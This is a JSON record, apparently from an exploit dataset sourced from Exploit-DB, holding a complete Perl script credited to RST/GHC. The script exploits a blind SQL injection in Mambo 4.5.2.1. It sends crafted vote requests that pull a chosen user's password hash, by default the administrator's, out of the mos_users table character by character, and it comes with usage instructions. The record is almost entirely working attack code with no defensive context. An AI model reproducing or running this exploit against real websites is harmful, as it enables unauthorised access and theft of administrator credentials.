{
  "id": "1061",
  "title": "Mambo 4.5.2.1 - SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n### Mambo <= 4.5.2.1, MySQL => 4.1 sql injection exploit by RST/GHC\r\n### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n### (c)oded by 1dt.w0lf , 21.06.05\r\n### http://rst.void.ru , http://ghc.ru\r\n### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\n\r\nuse IO::Socket;\r\n\r\nif (@ARGV < 3) { &usage; }\r\n\r\n$server    = $ARGV[0];\r\n$path      = $ARGV[1];\r\n$member_id = $ARGV[2];\r\n\r\n$news_id = 1;\r\n$news_itemid = 1;\r\n\r\n$server =~ s!(http:\\/\\/)!!;\r\n\r\n$request  = 'http://';\r\n$request .= $server;\r\n$request .= $path;\r\n\r\n$s_num = 1;\r\n$|++;\r\n$n = 0;\r\n&head;\r\nprint \"\\r\\n\";\r\nprint \" [~]  SERVER : $server\\r\\n\";\r\nprint \" [~]    PATH : $path\\r\\n\";\r\nprint \" [~] USER ID : $member_id\\r\\n\";\r\nprint \" [~] SEARCHING PASSWORD ... [|]\";\r\n\r\nwhile(1)\r\n{\r\nif(&found(47,58)==0) { &found(96,103); } \r\n$char = $i;\r\nif ($char==\"0\") \r\n { \r\n if(length($allchar) > 0){\r\n print qq{\\b\\b DONE ] \r\n ---------------------------------------------------------------\r\n USER ID : $member_id\r\n    HASH : $allchar\r\n ---------------------------------------------------------------\r\n };\r\n }\r\n else\r\n {\r\n print \"\\b\\b FAILED ]\";\r\n }\r\n exit();  \r\n }\r\nelse \r\n {  \r\n $allchar .= chr($char); \r\n }\r\n$s_num++;\r\n}\r\n\r\nsub found($$)\r\n {\r\n my $fmin = $_[0];\r\n my $fmax = $_[1];\r\n if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }\r\n \r\n $r = int($fmax - ($fmax-$fmin)/2);\r\n $check = \"/**/BETWEEN/**/$r/**/AND/**/$fmax\";\r\n if ( &check($check) ) { &found($r,$fmax); }\r\n else { &found($fmin,$r); }\r\n }\r\n \r\nsub crack($$)\r\n {\r\n my $cmin = $_[0];\r\n my $cmax = $_[1];\r\n $i = $cmin;\r\n while ($i<$cmax)\r\n  {\r\n  $crcheck = \"=$i\";\r\n  if ( &check($crcheck) ) { return $i; }\r\n  $i++;\r\n  }\r\n $i = 0;\r\n return $i;\r\n }\r\n \r\nsub check($)\r\n {\r\n $n++;\r\n status();\r\n $ccheck = $_[0]; \r\n $sock1 = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\");\r\n printf $sock1 (\"GET %sindex.php?option=com_content&task=vote&id=%d&Itemid=%d&cid=1&user_rating=1,rating_count=(SELECT/**/if((ascii(substring((SELECT/**/password/**/FROM/**/mos_users/**/WHERE/**/id=%d),%d,1)))%s,1145711457,0)),lastip=666/* HTTP/1.0\\nHost: %s\\nAccept: */*\\nConnection: close\\n\\n\",\r\n $path,$news_id,$news_itemid,$member_id,$s_num,$ccheck,$server); \r\n sleep 1; \r\n $sock2 = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\");\r\n printf $sock2 (\"GET %sindex.php?option=com_content&task=view&id=%d&Itemid=%d&cid=1 HTTP/1.0\\nHost: %s\\nAccept: */*\\nConnection: close\\n\\n\",\r\n $path,$news_id,$news_itemid,$server);\r\n\r\n while(<$sock2>) \r\n  {   \r\n  if (/1145711457/) { return 1; }\r\n  } \r\n\r\n return 0;\r\n }\r\n \r\nsub status()\r\n{\r\n  $status = $n % 5;\r\n  if($status==0){ print \"\\b\\b/]\";  }\r\n  if($status==1){ print \"\\b\\b-]\";  }\r\n  if($status==2){ print \"\\b\\b\\\\]\"; }\r\n  if($status==3){ print \"\\b\\b|]\";  }\r\n}\r\n\r\nsub usage()\r\n {\r\n &head;\r\n print q(\r\n USAGE\r\n    r57mambo.pl [HOST] [/FOLDER/] [USER_ID]\r\n  \r\n OPTIONS\r\n    HOST    - Host where mambo installed\r\n    FOLDER  - Folder where mambo installed\r\n    USER_ID - User ID for brute (default is 62 for admin)\r\n  \r\n E.G.\r\n    r57mambo.pl http://blah.com /mambo/ 62\r\n ---------------------------------------------------------------\r\n (c)oded by 1dt.w0lf\r\n RST/GHC , http://rst.void.ru , http://ghc.ru\r\n );\r\n exit();\r\n }\r\nsub head()\r\n {\r\n print q(\r\n ---------------------------------------------------------------\r\n Mambo <= 4.5.2.1, MySQL => 4.1 sql injection exploit by RST/GHC\r\n ---------------------------------------------------------------\r\n );\r\n }\r\n\r\n# milw0rm.com [2005-06-21]",
  "url": "https://www.exploit-db.com/exploits/1061"
}